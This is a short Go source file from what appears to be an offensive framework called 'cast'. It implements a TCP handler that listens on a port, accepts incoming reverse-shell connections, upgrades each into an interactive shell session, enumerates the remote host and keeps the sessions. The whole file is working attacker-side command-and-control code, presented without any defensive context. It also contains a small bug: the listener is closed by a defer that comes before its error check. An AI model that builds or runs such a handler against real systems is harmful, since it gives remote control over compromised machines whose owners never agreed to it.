package handler

import (
	"github.com/kulinacs/cast/agent"
	"github.com/kulinacs/cast/session"
	log "github.com/sirupsen/logrus"
	"net"
	"strconv"
)

// TCPHandler is a TCP reverse shell handler
type TCPHandler struct {
	Sessions []session.Shell
}

// Handle listens for and creates incoming sessions
func (handler *TCPHandler) Handle(port int) {
	soc, err := net.Listen("tcp4", ":"+strconv.Itoa(port))
	defer soc.Close()
	log.WithFields(log.Fields{"port": port}).Info("starting handler")
	if err != nil {
		log.Fatal(err)
	}
	for {
		conn, err := soc.Accept()
		if err != nil {
			log.Fatal(err)
		}
		shellSession, err := session.UpgradeShell(agent.NewShell(conn, 20))
		if err != nil {
			log.Fatal(err)
		}
		shellSession.Enumerate()
		log.WithFields(log.Fields{"session": shellSession}).Info("new session")
		handler.Sessions = append(handler.Sessions, shellSession)
	}
}
